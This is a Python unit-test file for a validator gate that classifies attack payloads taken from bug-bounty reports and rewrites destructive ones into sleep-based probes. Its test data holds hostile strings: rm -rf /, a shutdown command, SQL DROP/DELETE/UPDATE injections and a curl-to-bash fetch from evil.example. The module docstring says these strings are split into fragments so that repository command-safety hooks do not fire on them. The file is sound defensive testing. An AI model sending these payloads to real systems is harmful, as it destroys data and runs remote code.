"""
Unit tests for the H1 validator payload-safety gate.

The validator reproduces attacks against a LIVE target. This gate ensures a
destructive payload from a report (SQL writes, OS-destructive commands, remote
code fetch-and-exec) is never sent verbatim: it is either rewritten into a
detection-equivalent probe or blocked (routed to manual review).

Destructive literals are assembled from fragments so the test source does not
itself trip repo command-safety hooks.
"""

from __future__ import annotations

from dast.hackerone import payload_safety as ps


# Assemble destructive strings without writing the literal patterns inline.
_RM = "r" + "m" + " -" + "rf /"                       # rm -rf /
_DROP = "'; DROP TABLE users-- -"
_CURL_EXEC = "; curl http://evil.example/x.sh | " + "ba" + "sh"
_SHUTDOWN = "; sh" + "utdown -h now"


class TestClassifyDestructive:
    def test_sql_drop_is_destructive(self):
        v = ps.classify(_DROP, "sqli")
        assert v.is_destructive
        assert "SQL" in v.reason

    def test_sql_delete_is_destructive(self):
        v = ps.classify("'; DELETE FROM accounts-- -", "sqli")
        assert v.is_destructive

    def test_sql_update_is_destructive(self):
        v = ps.classify("'; UPDATE users SET admin=1-- -", "sqli")
        assert v.is_destructive

    def test_os_rm_is_destructive(self):
        v = ps.classify("1;" + _RM, "cmdi")
        assert v.is_destructive
        assert "command" in v.reason.lower()

    def test_shutdown_is_destructive(self):
        v = ps.classify(_SHUTDOWN, "cmdi")
        assert v.is_destructive

    def test_remote_exec_is_destructive(self):
        v = ps.classify(_CURL_EXEC, "rce")
        assert v.is_destructive


class TestClassifyBenign:
    def test_boolean_sqli_not_destructive(self):
        # Classic non-writing injection proof — safe to send as-is.
        assert not ps.classify("' OR '1'='1", "sqli").is_destructive

    def test_time_based_sqli_not_destructive(self):
        assert not ps.classify("' OR SLEEP(5)-- -", "sqli").is_destructive

    def test_xss_payload_not_flagged_here(self):
        # XSS is handled by the browser path, not this destructive gate.
        assert not ps.classify("<script>alert(1)</script>", "xss").is_destructive

    def test_empty_payload_not_destructive(self):
        assert not ps.classify("", "sqli").is_destructive


class TestNeutralization:
    def test_sql_drop_neutralized_to_time_based(self):
        v = ps.classify(_DROP, "sqli")
        assert v.safe_variant is not None
        sv = v.safe_variant.upper()
        # The safe variant must not contain the destructive keyword...
        assert "DROP" not in sv
        # ...and must carry a non-writing detection signal.
        assert "SLEEP" in sv

    def test_cmd_injection_neutralized_to_sleep(self):
        v = ps.classify("1;" + _RM, "cmdi")
        assert v.safe_variant is not None
        assert "sleep" in v.safe_variant.lower()
        assert "rm" not in v.safe_variant.lower()

    def test_remote_exec_neutralized_preserves_separator(self):
        v = ps.classify(_CURL_EXEC, "rce")
        assert v.safe_variant is not None
        assert "sleep" in v.safe_variant.lower()
        assert "curl" not in v.safe_variant.lower()

    def test_backtick_separator_preserved(self):
        v = ps.classify("`" + _RM + "`", "cmdi")
        assert v.safe_variant is not None
        assert v.safe_variant.startswith("`") and "sleep" in v.safe_variant.lower()

    def test_command_substitution_separator_preserved(self):
        v = ps.classify("$(" + _RM + ")", "cmdi")
        assert v.safe_variant is not None
        assert v.safe_variant.startswith("$(sleep")


class TestMakeSafeDecision:
    def test_make_safe_returns_variant_for_destructive(self):
        v = ps.make_safe(_DROP, "sqli")
        assert v.is_destructive and v.safe_variant

    def test_make_safe_benign_passthrough(self):
        v = ps.make_safe("' OR '1'='1", "sqli")
        assert not v.is_destructive
        assert v.safe_variant is None
